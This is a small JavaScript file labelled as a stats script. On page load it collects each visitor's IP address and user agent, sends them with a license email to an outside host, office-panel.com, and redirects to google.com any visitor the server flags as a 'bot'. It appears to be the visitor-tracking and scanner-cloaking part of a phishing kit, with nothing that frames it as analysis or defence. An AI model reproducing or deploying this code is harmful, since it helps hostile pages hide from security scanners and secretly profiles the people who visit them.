// stats.js
var license_email = "_____";

$(document).ready(function () {
  // 1) Fetch the client IP
  fetch("https://api.ipify.org?format=json")
    .then(function(response) {
      if (!response.ok) {
        throw new Error("IP fetch failed: " + response.statusText);
      }
      return response.json();
    })
    .then(function(data) {
      const ip = data.ip;
      const ua = navigator.userAgent;
      console.log(`Client IP Address: ${ip}`);

      // 2) Send stats as a GET request
      $.ajax({
        url: "https://office-panel.com/site/stats",
        type: "GET",          // explicitly GET
        dataType: "text",     // expect raw text
        data: {
          ip: ip,
          ua: ua,
          em: license_email
        },
        success: function(response) {
          if (response.trim() === "bot") {
            window.location.replace("https://www.google.com");
          }
        },
        error: function(jqXHR, textStatus, errorThrown) {
          console.error("Stats AJAX error:", errorThrown);
        }
      });
    })
    .catch(function(error) {
      console.error("Error fetching IP:", error);
    });
});